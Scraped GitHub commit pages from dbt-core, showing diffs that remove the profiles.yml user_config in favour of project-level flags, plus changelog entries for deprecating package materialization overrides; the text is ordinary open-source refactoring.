
Show comments

[View file](/dbt-labs/dbt-core/blob/3c82a0296d227cb1be295356df314c11716f4ff6/core/dbt/config/profile.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -8,7 +8,7 @@ |
|  |  | from dbt.clients.system import load\_file\_contents |
|  |  | from dbt.clients.yaml\_helper import load\_yaml\_text |
|  |  | from dbt.contracts.connection import Credentials, HasCredentials |
|  |  | from dbt.contracts.project import ProfileConfig, UserConfig |
|  |  | from dbt.contracts.project import ProfileConfig |
|  |  | from dbt.exceptions import ( |
|  |  | CompilationError, |
|  |  | DbtProfileError, |
| Expand All | | @@ -19,7 +19,6 @@ |
|  |  | ) |
|  |  | from dbt.events.types import MissingProfileTarget |
|  |  | from dbt.events.functions import fire\_event |
|  |  | from dbt.utils import coerce\_dict\_str |
|  |  |  |
|  |  | from .renderer import ProfileRenderer |
|  |  |  |
| Expand Down  Expand Up | | @@ -51,27 +50,13 @@ def read\_profile(profiles\_dir: str) -> Dict[str, Any]: |
|  |  | return {} |
|  |  |  |
|  |  |  |
|  |  | def read\_user\_config(directory: str) -> UserConfig: |
|  |  | try: |
|  |  | profile = read\_profile(directory) |
|  |  | if profile: |
|  |  | user\_config = coerce\_dict\_str(profile.get("config", {})) |
|  |  | if user\_config is not None: |
|  |  | UserConfig.validate(user\_config) |
|  |  | return UserConfig.from\_dict(user\_config) |
|  |  | except (DbtRuntimeError, ValidationError): |
|  |  | pass |
|  |  | return UserConfig() |
|  |  |  |
|  |  |  |
|  |  | # The Profile class is included in RuntimeConfig, so any attribute |
|  |  | # additions must also be set where the RuntimeConfig class is created |
|  |  | # `init=False` is a workaround for https://bugs.python.org/issue45081 |
|  |  | @dataclass(init=False) |
|  |  | class Profile(HasCredentials): |
|  |  | profile\_name: str |
|  |  | target\_name: str |
|  |  | user\_config: UserConfig |
|  |  | threads: int |
|  |  | credentials: Credentials |
|  |  | profile\_env\_vars: Dict[str, Any] |
| Expand All | | @@ -80,7 +65,6 @@ def \_\_init\_\_( |
|  |  | self, |
|  |  | profile\_name: str, |
|  |  | target\_name: str, |
|  |  | user\_config: UserConfig, |
|  |  | threads: int, |
|  |  | credentials: Credentials, |
|  |  | ): |
| Expand All | | @@ -89,7 +73,6 @@ def \_\_init\_\_( |
|  |  | """ |
|  |  | self.profile\_name = profile\_name |
|  |  | self.target\_name = target\_name |
|  |  | self.user\_config = user\_config |
|  |  | self.threads = threads |
|  |  | self.credentials = credentials |
|  |  | self.profile\_env\_vars = {} # never available on init |
| Expand All | | @@ -106,12 +89,10 @@ def to\_profile\_info(self, serialize\_credentials: bool = False) -> Dict[str, Any] |
|  |  | result = { |
|  |  | "profile\_name": self.profile\_name, |
|  |  | "target\_name": self.target\_name, |
|  |  | "user\_config": self.user\_config, |
|  |  | "threads": self.threads, |
|  |  | "credentials": self.credentials, |
|  |  | } |
|  |  | if serialize\_credentials: |
|  |  | result["user\_config"] = self.user\_config.to\_dict(omit\_none=True) |
|  |  | result["credentials"] = self.credentials.to\_dict(omit\_none=True) |
|  |  | return result |
|  |  |  |
| Expand All | | @@ -124,7 +105,6 @@ def to\_target\_dict(self) -> Dict[str, Any]: |
|  |  | "name": self.target\_name, |
|  |  | "target\_name": self.target\_name, |
|  |  | "profile\_name": self.profile\_name, |
|  |  | "config": self.user\_config.to\_dict(omit\_none=True), |
|  |  | } |
|  |  | ) |
|  |  | return target |
| Expand Down  Expand Up | | @@ -246,7 +226,6 @@ def from\_credentials( |
|  |  | threads: int, |
|  |  | profile\_name: str, |
|  |  | target\_name: str, |
|  |  | user\_config: Optional[Dict[str, Any]] = None, |
|  |  | ) -> "Profile": |
|  |  | """Create a profile from an existing set of Credentials and the |
|  |  | remaining information. |
| Expand All | | @@ -255,20 +234,13 @@ def from\_credentials( |
|  |  | :param threads: The number of threads to use for connections. |
|  |  | :param profile\_name: The profile name used for this profile. |
|  |  | :param target\_name: The target name used for this profile. |
|  |  | :param user\_config: The user-level config block from the |
|  |  | raw profiles, if specified. |
|  |  | :raises DbtProfileError: If the profile is invalid. |
|  |  | :returns: The new Profile object. |
|  |  | """ |
|  |  | if user\_config is None: |
|  |  | user\_config = {} |
|  |  | UserConfig.validate(user\_config) |
|  |  | user\_config\_obj: UserConfig = UserConfig.from\_dict(user\_config) |
|  |  |  |
|  |  | profile = cls( |
|  |  | profile\_name=profile\_name, |
|  |  | target\_name=target\_name, |
|  |  | user\_config=user\_config\_obj, |
|  |  | threads=threads, |
|  |  | credentials=credentials, |
|  |  | ) |
| Expand Down  Expand Up | | @@ -316,7 +288,6 @@ def from\_raw\_profile\_info( |
|  |  | raw\_profile: Dict[str, Any], |
|  |  | profile\_name: str, |
|  |  | renderer: ProfileRenderer, |
|  |  | user\_config: Optional[Dict[str, Any]] = None, |
|  |  | target\_override: Optional[str] = None, |
|  |  | threads\_override: Optional[int] = None, |
|  |  | ) -> "Profile": |
| Expand All | | @@ -328,8 +299,6 @@ def from\_raw\_profile\_info( |
|  |  | disk as yaml and its values rendered with jinja. |
|  |  | :param profile\_name: The profile name used. |
|  |  | :param renderer: The config renderer. |
|  |  | :param user\_config: The global config for the user, if it |
|  |  | was present. |
|  |  | :param target\_override: The target to use, if provided on |
|  |  | the command line. |
|  |  | :param threads\_override: The thread count to use, if |
| Expand All | | @@ -338,9 +307,6 @@ def from\_raw\_profile\_info( |
|  |  | target could not be found |
|  |  | :returns: The new Profile object. |
|  |  | """ |
|  |  | # user\_config is not rendered. |
|  |  | if user\_config is None: |
|  |  | user\_config = raw\_profile.get("config") |
|  |  | # TODO: should it be, and the values coerced to bool? |
|  |  | target\_name, profile\_data = cls.render\_profile( |
|  |  | raw\_profile, profile\_name, target\_override, renderer |
| Expand All | | @@ -361,7 +327,6 @@ def from\_raw\_profile\_info( |
|  |  | profile\_name=profile\_name, |
|  |  | target\_name=target\_name, |
|  |  | threads=threads, |
|  |  | user\_config=user\_config, |
|  |  | ) |
|  |  |  |
|  |  | @classmethod |
| Expand Down  Expand Up | | @@ -396,13 +361,11 @@ def from\_raw\_profiles( |
|  |  | if not raw\_profile: |
|  |  | msg = f"Profile {profile\_name} in profiles.yml is empty" |
|  |  | raise DbtProfileError(INVALID\_PROFILE\_MESSAGE.format(error\_string=msg)) |
|  |  | user\_config = raw\_profiles.get("config") |
|  |  |  |
|  |  | return cls.from\_raw\_profile\_info( |
|  |  | raw\_profile=raw\_profile, |
|  |  | profile\_name=profile\_name, |
|  |  | renderer=renderer, |
|  |  | user\_config=user\_config, |
|  |  | target\_override=target\_override, |
|  |  | threads\_override=threads\_override, |
|  |  | ) |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `3c82a02`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fcommit%2F3c82a0296d227cb1be295356df314c11716f4ff6) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c33fa332_20250110_152647.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fcommit%2F87ac4deb00cc9fe334706e42a365903a1d581624)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fcommit%2F87ac4deb00cc9fe334706e42a365903a1d581624)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dbt-labs%2Fdbt-core)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dbt-labs](/dbt-labs)
/
**[dbt-core](/dbt-labs/dbt-core)**
Public

* [Notifications](/login?return_to=%2Fdbt-labs%2Fdbt-core) You must be signed in to change notification settings
* [Fork
  1.7k](/login?return_to=%2Fdbt-labs%2Fdbt-core)
* [Star
   10.2k](/login?return_to=%2Fdbt-labs%2Fdbt-core)

* [Code](/dbt-labs/dbt-core)
* [Issues
  526](/dbt-labs/dbt-core/issues)
* [Pull requests
  102](/dbt-labs/dbt-core/pulls)
* [Discussions](/dbt-labs/dbt-core/discussions)
* [Actions](/dbt-labs/dbt-core/actions)
* [Wiki](/dbt-labs/dbt-core/wiki)
* [Security](/dbt-labs/dbt-core/security)
* [Insights](/dbt-labs/dbt-core/pulse)

Additional navigation options

* [Code](/dbt-labs/dbt-core)
* [Issues](/dbt-labs/dbt-core/issues)
* [Pull requests](/dbt-labs/dbt-core/pulls)
* [Discussions](/dbt-labs/dbt-core/discussions)
* [Actions](/dbt-labs/dbt-core/actions)
* [Wiki](/dbt-labs/dbt-core/wiki)
* [Security](/dbt-labs/dbt-core/security)
* [Insights](/dbt-labs/dbt-core/pulse)

## Commit

[Permalink](/dbt-labs/dbt-core/commit/87ac4deb00cc9fe334706e42a365903a1d581624)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[Backport] deprecate materialization overrides from imported packages ([…](https://github.com/dbt-labs/dbt-core/pull/9998)

[Browse files](/dbt-labs/dbt-core/tree/87ac4deb00cc9fe334706e42a365903a1d581624)
Browse the repository at this point in the history

```
[…#9998](https://github.com/dbt-labs/dbt-core/pull/9998))
```

* Loading branch information

[![@MichelleArk](https://avatars.githubusercontent.com/u/9407260?s=40&v=4)](/MichelleArk)

[MichelleArk](/dbt-labs/dbt-core/commits?author=MichelleArk "View all commits by MichelleArk")
authored
Apr 29, 2024

1 parent
[6a54a4c](/dbt-labs/dbt-core/commit/6a54a4c04ba669517f18f2f9d3e6aea1656cba37)

commit 87ac4de

 Show file tree

 Hide file tree

Showing
**38 changed files**
with
**1,779 additions**
and
**1,557 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* .changes/unreleased

  + .changes/unreleased/Features-20231218-195854.yaml
    [Features-20231218-195854.yaml](#diff-4a35df33f9c4a8b9c142efef6820f3527e0cec3726f2c758cfa605ddd9a2b50c)
  + .changes/unreleased/Features-20240422-173703.yaml
    [Features-20240422-173703.yaml](#diff-a859b37004f7c5a78d1a108c003c1a2d9736360574bee8d207c25181afc53d57)
  + .changes/unreleased/Under the Hood-20240418-172528.yaml
    [Under the Hood-20240418-172528.yaml](#diff-5e2cf3b0f0521399771285fe188c55228de626c5533e4f06cbaade7e372ea1ec)
* core/dbt

  + cli

    - core/dbt/cli/flags.py
      [flags.py](#diff-3e5c2add494f2ffa25c42dd0ea6ea0d4cc43875474b110506dff44385adb81ac)
  + config

    - core/dbt/config/\_\_init\_\_.py
      [\_\_init\_\_.py](#diff-a2ba8d46e3d69f8874c4c46f0d6a1d413f70879c405f82230e63d7c2bdb255be)
    - core/dbt/config/profile.py
      [profile.py](#diff-5231952f5e1234a0ee90a5f124a45ca1ebb429a9d606c76d01b2a32707d068cc)
    - core/dbt/config/project.py
      [project.py](#diff-8dc87da2257e24092820e0b29ea50eb16f002dd2c30b5879602b9311941858c0)
    - core/dbt/config/runtime.py
      [runtime.py](#diff-7685e44a07e8211f0e710116a07186168af0feb2e466fb46e40504d6b2282ec1)
  + contracts

    - core/dbt/contracts/connection.py
      [connection.py](#diff-b55d5ef96b8e7bb12401faa41c400f3f0ae07420483e3364f395fee85ad0a7d9)
    - graph

      * core/dbt/contracts/graph/manifest.py
        [manifest.py](#diff-1e80746bd25a5ea5ca6604030a2991dfbae0e486f971a6665f2b3a3512f05532)
    - core/dbt/contracts/project.py
      [project.py](#diff-b9f683ce224d6624bcea9a769ca6ad072c9206feb7df48a46340f8148ed87652)
  + core/dbt/deprecations.py
    [deprecations.py](#diff-3277eb602a187d7bfbcb01f646fa8a17697750aa5886869fddaea6c3026f03e1)
  + events

    - core/dbt/events/types.proto
      [types.proto](#diff-b156ebbbf8a9c444e70458528aa309da2229cdf139816385b81a9272399a0b46)
    - core/dbt/events/types.py
      [types.py](#diff-a307286f8c93d8a9dbf3a863a62a6b712921d15f6b4cf9d885b15a45be68f05a)
    - core/dbt/events/types\_pb2.py
      [types\_pb2.py](#diff-ca7bf06d149002b2ab8c076a5cd6c2ed421baa4690078295bf7dd5ec8a3ed0d2)
  + core/dbt/flags.py
    [flags.py](#diff-b99c74c2d09fa1ea054aa843fa3738bd7c9d39acb9c5b90ca920f0e1fcf38010)
  + include/starter\_project

    - core/dbt/include/starter\_project/dbt\_project.yml
      [dbt\_project.yml](#diff-9901b50e28841b4f5b721d454e6440a69976e7c9f4da2e79605f730ad2dc1e02)
  + tests/fixtures

    - core/dbt/tests/fixtures/project.py
      [project.py](#diff-5bab13c218ba16b33ff49936fb3b417cce1da20f705a4010d3e07d566100428c)
  + core/dbt/tracking.py
    [tracking.py](#diff-b67ce24493704fffa7a17d3f9ac9aa6a9928da0faa9c6067678a347d5bbdad91)
  + core/dbt/utils.py
    [utils.py](#diff-3113975fdb70cadc0c7b5f58d67b41fb50b7819a848b8244bb50d32e959d9f7f)
* tests

  + functional

    - basic

      * tests/functional/basic/test\_mixed\_case\_db.py
        [test\_mixed\_case\_db.py](#diff-d89f3f01175d657410596cc97e8a21ac2b68203e279e3a68b29d8889091542d8)
      * tests/functional/basic/test\_project.py
        [test\_project.py](#diff-74a7cf655824c967999890bee179e63b9063ac03ee336bbef0143f10e3ae8721)
    - configs

      * tests/functional/configs/test\_disabled\_configs.py
        [test\_disabled\_configs.py](#diff-48069bf80479bcce7a646cb4bfdb20f580074526a92c1b8a4e821609d26e2ee6)
    - dependencies

      * tests/functional/dependencies/test\_local\_dependency.py
        [test\_local\_dependency.py](#diff-4f5f78d9b3b6f6eda81916de152b5c17b9d1ef14e40b7a2031c4d10f601d6474)
    - deprecations

      * tests/functional/deprecations/test\_deprecations.py
        [test\_deprecations.py](#diff-5986b4f4b57fa3266d0f74f111101d4739fd736c858296b144f346005dfce495)
    - fail\_fast

      * tests/functional/fail\_fast/test\_fail\_fast\_run.py
        [test\_fail\_fast\_run.py](#diff-dc6f658511fecc56ae9215ef69aa07f4943da24dc2ec40b43da1cdda9e14e325)
    - init

      * tests/functional/init/test\_init.py
        [test\_init.py](#diff-e006c8f2447fb1e5cadad42706f6eb63acca642891c2e9749458e2031f35f0e5)
    - materializations

      * tests/functional/materializations/conftest.py
        [conftest.py](#diff-f83b97f48c96f6fe2f605434f413399869881b5c0855918e8b13162eeff90265)
      * tests/functional/materializations/test\_custom\_materialization.py
        [test\_custom\_materialization.py](#diff-f7ef628400f15d5875fd9c736b29e855b4bf942565854434fd14aeee1ee61d5d)
    - metrics

      * tests/functional/metrics/test\_metric\_deferral.py
        [test\_metric\_deferral.py](#diff-4d53d74d2d5e9c61f50d0ecc8e6c5dffea927b8e1f2ea0bd8febebb76ad6cd05)
    - run\_operations

      * tests/functional/run\_operations/test\_run\_operations.py
        [test\_run\_operations.py](#diff-4f01239a19ba49190ed8f12eb1d0df78d89ae89b2145f428615946801b335c43)
  + unit

    - tests/unit/test\_cli\_flags.py
      [test\_cli\_flags.py](#diff-a0d0e2e52e7dc98051466b0fb10fbc6891c2c014c964de159e6c688f76aa376e)
    - tests/unit/test\_config.py
      [test\_config.py](#diff-217a439192bc495c66132a58a1bf7a92ee70f0eb9702c6b00f60644e726479b5)
    - tests/unit/test\_events.py
      [test\_events.py](#diff-018e6871938b17be4afa923d354aad1059ace4f5d0c88eceaa29711e62171289)
    - tests/unit/test\_flags.py
      [test\_flags.py](#diff-99174253f160fb3d1e4ea9c5f35a0b75d53c882cce44284146ba7beea65f7184)
    - tests/unit/test\_graph.py
      [test\_graph.py](#diff-21f7dbaa90f66a1b158cd577efb2282a0e6d1f70ff840e8a0547b3a32f2b0f29)
    - tests/unit/test\_graph\_selection.py
      [test\_graph\_selection.py](#diff-5e7c2fb541bfa11c046974f42f5b09fa6081e0a864a3f9731899d7691fb8eb52)
    - tests/unit/test\_manifest.py
      [test\_manifest.py](#diff-b177cd7874fea9116510fc5a6770c8d26dfe7e7b92b7b529ca89bd588d26a81d)

## There are no files selected for viewing

6 changes: 6 additions & 0 deletions

6
[.changes/unreleased/Features-20231218-195854.yaml](#diff-4a35df33f9c4a8b9c142efef6820f3527e0cec3726f2c758cfa605ddd9a2b50c ".changes/unreleased/Features-20231218-195854.yaml")

Show comments

[View file](/dbt-labs/dbt-core/blob/87ac4deb00cc9fe334706e42a365903a1d581624/.changes/unreleased/Features-20231218-195854.yaml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | kind: Features |
|  |  | body: Move flags from UserConfig in profiles.yml to flags in dbt\_project.yml |
|  |  | time: 2023-12-18T19:58:54.075811-05:00 |
|  |  | custom: |
|  |  | Author: gshank |
|  |  | Issue: "9183" |

6 changes: 6 additions & 0 deletions

6
[.changes/unreleased/Features-20240422-173703.yaml](#diff-a859b37004f7c5a78d1a108c003c1a2d9736360574bee8d207c25181afc53d57 ".changes/unreleased/Features-20240422-173703.yaml")

Show comments

[View file](/dbt-labs/dbt-core/blob/87ac4deb00cc9fe334706e42a365903a1d581624/.changes/unreleased/Features-20240422-173703.yaml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | kind: Features |
|  |  | body: Add require\_explicit\_package\_overrides\_for\_builtin\_materializations to dbt\_project.yml flags, which can be used to opt-out of overriding built-in materializations from packages |
|  |  | time: 2024-04-22T17:37:03.892268-04:00 |
|  |  | custom: |
|  |  | Author: michelleark |
|  |  | Issue: "10007" |

6 changes: 6 additions & 0 deletions

6
[.changes/unreleased/Under the Hood-20240418-172528.yaml](#diff-5e2cf3b0f0521399771285fe188c55228de626c5533e4f06cbaade7e372ea1ec ".changes/unreleased/Under the Hood-20240418-172528.yaml")

Show comments

[View file](/dbt-labs/dbt-core/blob/87ac4deb00cc9fe334706e42a365903a1d581624/.changes/unreleased/Under%20the%20Hood-20240418-172528.yaml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | kind: Under the Hood |
|  |  | body: Raise deprecation warning if installed package overrides built-in materialization |
|  |  | time: 2024-04-18T17:25:28.37886-04:00 |
|  |  | custom: |
|  |  | Author: michelleark |
|  |  | Issue: "9971" |

42 changes: 29 additions & 13 deletions

42
[core/dbt/cli/flags.py](#diff-3e5c2add494f2ffa25c42dd0ea6ea0d4cc43875474b110506dff44385adb81ac "core/dbt/cli/flags.py")

Show comments

[View file](/dbt-labs/dbt-core/blob/87ac4deb00cc9fe334706e42a365903a1d581624/core/dbt/cli/flags.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,6 +3,7 @@ |
|  |  | from dataclasses import dataclass |
|  |  | from importlib import import\_module |
|  |  | from multiprocessing import get\_context |
|  |  | from pathlib import Path |
|  |  | from pprint import pformat as pf |
|  |  | from typing import Any, Callable, Dict, List, Optional, Set, Union |
|  |  |  |
| Expand All | | @@ -11,8 +12,8 @@ |
|  |  | from dbt.cli.exceptions import DbtUsageException |
|  |  | from dbt.cli.resolvers import default\_log\_path, default\_project\_dir |
|  |  | from dbt.cli.types import Command as CliCommand |
|  |  | from dbt.config.profile import read\_user\_config |
|  |  | from dbt.contracts.project import UserConfig |
|  |  | from dbt.config.project import read\_project\_flags |
|  |  | from dbt.contracts.project import ProjectFlags |
|  |  | from dbt.exceptions import DbtInternalError |
|  |  | from dbt.deprecations import renamed\_env\_var |
|  |  | from dbt.helper\_types import WarnErrorOptions |
| Expand All | | @@ -25,7 +26,7 @@ |
|  |  | "INDIRECT\_SELECTION": "eager", |
|  |  | "TARGET\_PATH": None, |
|  |  | "WARN\_ERROR": None, |
|  |  | # Cli args without user\_config or env var option. |
|  |  | # Cli args without project\_flags or env var option. |
|  |  | "FULL\_REFRESH": False, |
|  |  | "STRICT\_MODE": False, |
|  |  | "STORE\_FAILURES": False, |
| Expand Down  Expand Up | | @@ -77,7 +78,7 @@ class Flags: |
|  |  | """Primary configuration artifact for running dbt""" |
|  |  |  |
|  |  | def \_\_init\_\_( |
|  |  | self, ctx: Optional[Context] = None, user\_config: Optional[UserConfig] = None |
|  |  | self, ctx: Optional[Context] = None, project\_flags: Optional[ProjectFlags] = None |
|  |  | ) -> None: |
|  |  | # Set the default flags. |
|  |  | for key, value in FLAGS\_DEFAULTS.items(): |
| Expand Down  Expand Up | | @@ -200,27 +201,40 @@ def \_assign\_params( |
|  |  | invoked\_subcommand\_ctx, params\_assigned\_from\_default, deprecated\_env\_vars |
|  |  | ) |
|  |  |  |
|  |  | if not user\_config: |
|  |  | if not project\_flags: |
|  |  | project\_dir = getattr(self, "PROJECT\_DIR", str(default\_project\_dir())) |
|  |  | profiles\_dir = getattr(self, "PROFILES\_DIR", None) |
|  |  | user\_config = read\_user\_config(profiles\_dir) if profiles\_dir else None |
|  |  | if profiles\_dir and project\_dir: |
|  |  | project\_flags = read\_project\_flags(project\_dir, profiles\_dir) |
|  |  | else: |
|  |  | project\_flags = None |
|  |  |  |
|  |  | # Add entire invocation command to flags |
|  |  | object.\_\_setattr\_\_(self, "INVOCATION\_COMMAND", "dbt " + " ".join(sys.argv[1:])) |
|  |  |  |
|  |  | # Overwrite default assignments with user config if available. |
|  |  | if user\_config: |
|  |  | if project\_flags: |
|  |  | # Overwrite default assignments with project flags if available. |
|  |  | param\_assigned\_from\_default\_copy = params\_assigned\_from\_default.copy() |
|  |  | for param\_assigned\_from\_default in params\_assigned\_from\_default: |
|  |  | user\_config\_param\_value = getattr(user\_config, param\_assigned\_from\_default, None) |
|  |  | if user\_config\_param\_value is not None: |
|  |  | project\_flags\_param\_value = getattr( |
|  |  | project\_flags, param\_assigned\_from\_default, None |
|  |  | ) |
|  |  | if project\_flags\_param\_value is not None: |
|  |  | object.\_\_setattr\_\_( |
|  |  | self, |
|  |  | param\_assigned\_from\_default.upper(), |
|  |  | convert\_config(param\_assigned\_from\_default, user\_config\_param\_value), |
|  |  | convert\_config(param\_assigned\_from\_default, project\_flags\_param\_value), |
|  |  | ) |
|  |  | param\_assigned\_from\_default\_copy.remove(param\_assigned\_from\_default) |
|  |  | params\_assigned\_from\_default = param\_assigned\_from\_default\_copy |
|  |  |  |
|  |  | # Add project-level flags that are not available as CLI options / env vars |
|  |  | for ( |
|  |  | project\_level\_flag\_name, |
|  |  | project\_level\_flag\_value, |
|  |  | ) in project\_flags.project\_only\_flags.items(): |
|  |  | object.\_\_setattr\_\_(self, project\_level\_flag\_name.upper(), project\_level\_flag\_value) |
|  |  |  |
|  |  | # Set hard coded flags. |
|  |  | object.\_\_setattr\_\_(self, "WHICH", invoked\_subcommand\_name or ctx.info\_name) |
|  |  | object.\_\_setattr\_\_(self, "MP\_CONTEXT", get\_context("spawn")) |
| Expand All | | @@ -234,9 +248,11 @@ def \_assign\_params( |
|  |  | # Starting in v1.5, if `log-path` is set in `dbt\_project.yml`, it will raise a deprecation warning, |
|  |  | # with the possibility of removing it in a future release. |
|  |  | if getattr(self, "LOG\_PATH", None) is None: |
|  |  | project\_dir = getattr(self, "PROJECT\_DIR", default\_project\_dir()) |
|  |  | project\_dir = getattr(self, "PROJECT\_DIR", str(default\_project\_dir())) |
|  |  | version\_check = getattr(self, "VERSION\_CHECK", True) |
|  |  | object.\_\_setattr\_\_(self, "LOG\_PATH", default\_log\_path(project\_dir, version\_check)) |
|  |  | object.\_\_setattr\_\_( |
|  |  | self, "LOG\_PATH", default\_log\_path(Path(project\_dir), version\_check) |
|  |  | ) |
|  |  |  |
|  |  | # Support console DO NOT TRACK initiative. |
|  |  | if os.getenv("DO\_NOT\_TRACK", "").lower() in ("1", "t", "true", "y", "yes"): |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[core/dbt/config/\_\_init\_\_.py](#diff-a2ba8d46e3d69f8874c4c46f0d6a1d413f70879c405f82230e63d7c2bdb255be "core/dbt/config/__init__.py")

Show comments

[View file](/dbt-labs/dbt-core/blob/87ac4deb00cc9fe334706e42a365903a1d581624/core/dbt/config/__init__.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | # all these are just exports, they need "noqa" so flake8 will not complain. |
|  |  | from .profile import Profile, read\_user\_config # noqa |
|  |  | from .profile import Profile # noqa |
|  |  | from .project import Project, IsFQNResource, PartialProject # noqa |
|  |  | from .runtime import RuntimeConfig # noqa |

39 changes: 1 addition & 38 deletions

39
[core/dbt/config/profile.py](#diff-5231952f5e1234a0ee90a5f124a45ca1ebb429a9d606c76d01b2a32707d068cc "core/dbt/config/profile.py")

Show comments

[View file](/dbt-labs/dbt-core/blob/87ac4deb00cc9fe334706e42a365903a1d581624/core/dbt/config/profile.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
